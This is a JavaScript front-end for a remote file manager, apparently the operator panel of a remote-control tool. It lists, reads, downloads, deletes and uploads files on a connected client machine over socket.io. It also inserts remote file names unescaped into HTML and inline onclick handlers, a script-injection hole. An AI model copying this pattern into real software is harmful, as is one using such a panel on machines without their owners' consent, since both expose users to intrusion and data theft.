// File Manager Modal-specific JavaScript
class ModalFileManager {
    constructor() {
        this.currentClientId = "";
        this.isConnected = false;
        this.socket = io();
        this.init();
    }

    init() {
        this.setupEventListeners();
        this.setupSocketEvents();
    }

    setupEventListeners() {
        document.getElementById('fm-btn-list').addEventListener('click', () => this.doList());
        document.getElementById('fm-btn-up').addEventListener('click', () => this.goUpDirectory());
        document.getElementById('fm-btn-upload').addEventListener('click', () => this.uploadFile());
        document.getElementById('fm-path').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') this.doList();
        });
    }

    setupSocketEvents() {
        this.socket.on('dir_list', (data) => {
            if (data.client_id !== this.currentClientId) return;
            this.handleDirectoryList(data);
        });

        this.socket.on('file_text', (data) => {
            if (data.client_id !== this.currentClientId) return;
            this.handleFileContent(data);
        });

        this.socket.on('command_result', (data) => {
            if (data.target_id && data.target_id !== this.currentClientId) return;
            this.handleCommandResult(data);
        });
    }

    connectToClient(clientId) {
        if (!clientId) return;
        this.currentClientId = clientId;
        this.isConnected = true;
        this.setStatus(`已连接到客户端 ${this.currentClientId}`, 'success');
        this.doList();
    }

    disconnectFromClient() {
        this.isConnected = false;
        this.currentClientId = "";
        this.clearFileList();
        document.getElementById('fm-file-text').textContent = '请选择文件进行操作。';
        this.setStatus('已断开连接', 'info');
    }

    setStatus(text, type = 'info') {
        const statusEl = document.getElementById('fm-status');
        const icons = {
            info: 'bx-info-circle',
            success: 'bx-check-circle',
            error: 'bx-error-circle',
        };
        statusEl.innerHTML = `<i class='bx ${icons[type] || icons.info}'></i> ${text}`;
        
        // 添加颜色样式
        statusEl.className = type === 'error' ? 'text-danger' : 
                           type === 'success' ? 'text-success' : '';
    }

    doList() {
        if (!this.isConnected) {
            this.setStatus('请先连接客户端', 'error');
            return;
        }
        const path = document.getElementById('fm-path').value || '.';
        this.socket.emit('request_list_dir', { client_id: this.currentClientId, path: path });
        this.setStatus('正在列出目录...', 'info');
    }

    goUpDirectory() {
        let path = document.getElementById('fm-path').value;
        if (!path || path === '.') {
            path = '..';
        } else {
            path = path.replace(/[\/\\]+$/, '');
            const lastSlash = Math.max(path.lastIndexOf('/'), path.lastIndexOf('\\'));
            if (lastSlash > 0) {
                path = path.substring(0, lastSlash);
            } else if (lastSlash === 0) {
                path = '/';
            } else {
                path = '.';
            }
        }
        document.getElementById('fm-path').value = path;
        this.doList();
    }

    uploadFile() {
        const input = document.getElementById('fm-upload-input');
        if (!input.files || input.files.length === 0) {
            alert('请选择要上传的文件');
            return;
        }
        const file = input.files[0];
        const destDir = document.getElementById('fm-path').value || '.';
        const separator = destDir.includes('/') ? '/' : '\\';
        const destPath = destDir + (destDir.endsWith(separator) ? '' : separator) + file.name;
        this.performFileUpload(file, destPath);
    }

    performFileUpload(file, destPath) {
        const chunkSize = 64 * 1024; // 64KB
        const reader = new FileReader();
        let offset = 0;
        
        const progressBar = document.getElementById('fm-upload-progress-bar');
        const progressContainer = document.getElementById('fm-upload-progress');
        progressContainer.style.display = 'block';
        
        reader.onload = (e) => {
            const arrayBuffer = e.target.result;
            const total = arrayBuffer.byteLength;
            
            const sendChunk = () => {
                const end = Math.min(offset + chunkSize, total);
                const slice = arrayBuffer.slice(offset, end);
                
                const u8 = new Uint8Array(slice);
                let binary = '';
                for (let i = 0; i < u8.length; i++) {
                    binary += String.fromCharCode(u8[i]);
                }
                const b64 = btoa(binary);
                
                const isLast = end >= total;
                this.socket.emit('web_upload_chunk', {
                    client_id: this.currentClientId,
                    dest_path: destPath,
                    chunk_index: Math.floor(offset / chunkSize),
                    total_chunks: Math.ceil(total / chunkSize),
                    data: b64,
                    is_last: isLast
                });
                
                offset = end;
                const progress = Math.min(100, Math.round(offset / total * 100));
                progressBar.style.width = progress + '%';
                this.setStatus(`上传中 ${progress}%`, 'info');
                
                if (!isLast) {
                    setTimeout(sendChunk, 10);
                } else {
                    this.setStatus('上传完成，等待服务器确认...', 'success');
                    setTimeout(() => {
                        progressContainer.style.display = 'none';
                        progressBar.style.width = '0%';
                        this.doList(); // 刷新文件列表
                    }, 2000);
                }
            };
            
            sendChunk();
        };
        
        reader.readAsArrayBuffer(file);
    }

    handleDirectoryList(data) {
        if (!data.dir_list) { 
            this.setStatus('列出目录失败: ' + (data.error || '未知错误'), 'error'); 
            return; 
        }
        
        const tbody = document.querySelector('#fm-files-tbl tbody');
        tbody.innerHTML = '';
        const cwd = data.dir_list.cwd;
        document.getElementById('fm-path').value = cwd;
        
        const entries = data.dir_list.entries || [];
        entries.sort((a, b) => (b.is_dir - a.is_dir) || (a.name.localeCompare(b.name)));
        
        if (entries.length === 0) {
            tbody.innerHTML = `
                <tr>
                    <td colspan="5" style="padding: 2rem; text-align: center; color: var(--text-muted);">
                        <i class='bx bx-folder-open'></i><br>
                        此目录为空
                    </td>
                </tr>
            `;
        } else {
            entries.forEach(entry => {
                const tr = this.createFileRow(entry);
                tbody.appendChild(tr);
            });
        }
        
        this.setStatus(`成功列出目录: ${cwd}`, 'success');
    }

    createFileRow(entry) {
        const tr = document.createElement('tr');
        tr.style.cssText = 'border-bottom: 1px solid var(--border-color);';
        
        const iconClass = entry.is_dir ? 'bxs-folder' : 'bxs-file-blank';
        const iconColor = entry.is_dir ? 'text-warning' : 'text-primary';
        const typeText = entry.is_dir ? '目录' : '文件';
        const sizeText = entry.is_dir ? '-' : this.formatFileSize(entry.size || 0);
        const timeText = entry.mtime ? new Date(entry.mtime * 1000).toLocaleString() : '未知';
        
        let actions = '';
        if (entry.is_dir) {
            actions = `<button class="btn btn-primary btn-sm" onclick="modalFileManager.openDirectory('${entry.name}')"><i class='bx bx-folder-open'></i> 打开</button>`;
        } else {
            actions = `
                <button class="btn btn-info btn-sm me-1" onclick="modalFileManager.readFile('${entry.name}')"><i class='bx bx-file'></i> 查看</button>
                <button class="btn btn-success btn-sm me-1" onclick="modalFileManager.downloadFile('${entry.name}')"><i class='bx bx-download'></i> 下载</button>
                <button class="btn btn-danger btn-sm" onclick="modalFileManager.deleteFile('${entry.name}')"><i class='bx bx-trash'></i> 删除</button>
            `;
        }
        
        tr.innerHTML = `
            <td style="padding: 0.75rem;">
                <div style="display: flex; align-items: center; gap: 0.5rem;">
                    <i class='bx ${iconClass} ${iconColor}'></i>
                    <span>${entry.name}</span>
                </div>
            </td>
            <td style="padding: 0.75rem;">
                <span class="badge ${entry.is_dir ? 'badge-warning' : 'badge-info'}" style="padding: 0.25rem 0.5rem; border-radius: 0.25rem; font-size: 0.75rem;">${typeText}</span>
            </td>
            <td style="padding: 0.75rem;">${sizeText}</td>
            <td style="padding: 0.75rem;"><small class="text-muted">${timeText}</small></td>
            <td style="padding: 0.75rem;">
                <div class="file-actions">${actions}</div>
            </td>
        `;
        
        return tr;
    }

    clearFileList() {
        const tbody = document.querySelector('#fm-files-tbl tbody');
        tbody.innerHTML = `
            <tr>
                <td colspan="5" style="padding: 2rem; text-align: center; color: var(--text-muted);">
                    <i class='bx bx-info-circle'></i><br>
                    请先连接客户端
                </td>
            </tr>
        `;
    }

    openDirectory(name) {
        const currentPath = document.getElementById('fm-path').value;
        const separator = currentPath.includes('/') ? '/' : '\\';
        const newPath = currentPath === '.' ? name : currentPath + (currentPath.endsWith(separator) ? '' : separator) + name;
        document.getElementById('fm-path').value = newPath;
        this.doList();
    }

    readFile(name) {
        const path = this.getCurrentPathFor(name);
        this.socket.emit('request_read_file', { client_id: this.currentClientId, path: path });
        this.setStatus('正在读取文件...', 'info');
    }

    downloadFile(name) {
        const path = this.getCurrentPathFor(name);
        this.socket.emit('send_command', { 
            target: this.currentClientId, 
            command: { action: "download", arg: path } 
        });
        this.setStatus('正在请求下载...', 'info');
    }

    deleteFile(name) {
        if (!confirm(`确定要删除 "${name}" 吗？`)) return;
        const path = this.getCurrentPathFor(name);
        this.socket.emit('request_delete_path', { client_id: this.currentClientId, path: path });
        this.setStatus('正在删除文件...', 'info');
    }
    
    getCurrentPathFor(name) {
        const currentPath = document.getElementById('fm-path').value;
        const separator = currentPath.includes('/') ? '/' : '\\';
        return currentPath + (currentPath.endsWith(separator) ? '' : separator) + name;
    }

    handleFileContent(data) {
        const pre = document.getElementById('fm-file-text');
        if (data.is_base64) {
            pre.textContent = "(文件为二进制，base64 显示)\n" + data.text;
        } else {
            pre.textContent = data.text;
        }
        this.setStatus(`已获取文件: ${data.path}`, 'success');
    }

    handleCommandResult(data) {
        const pre = document.getElementById('fm-file-text');
        if (data.output) {
            pre.textContent = data.output;
            this.setStatus('收到命令响应', 'info');
            
            // 如果是删除操作成功，刷新文件列表
            if (data.output.includes('删除成功')) {
                setTimeout(() => this.doList(), 1000);
            }
        }
    }

    formatFileSize(bytes) {
        if (bytes === 0) return '0 B';
        const k = 1024;
        const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    }
}

// Initialize on the window object so it can be accessed by inline onclick handlers
document.addEventListener('DOMContentLoaded', function() {
    window.modalFileManager = new ModalFileManager();
});